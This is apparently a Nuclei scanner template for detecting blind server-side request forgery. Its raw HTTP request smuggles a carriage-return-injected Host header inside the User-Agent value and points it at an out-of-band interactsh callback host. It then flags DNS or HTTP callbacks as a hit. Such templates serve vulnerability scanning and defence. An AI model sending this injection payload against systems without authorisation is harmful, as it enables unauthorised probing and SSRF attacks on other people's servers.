http:
- matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  raw:
  - 'GET / HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0%0dHost:
    {{Host}}.{{Port}}.BSSRF-118.{{interactsh-url}}

    Cache-Control: no-transform

    Accept-Encoding: gzip, deflate

    Accept: */*

    Host: {{Hostname}}

    '
  unsafe: true
id: blind-ssrf-118
info:
  author: reewardius
  name: Blind SSRF
  severity: high
  tags: ssrf
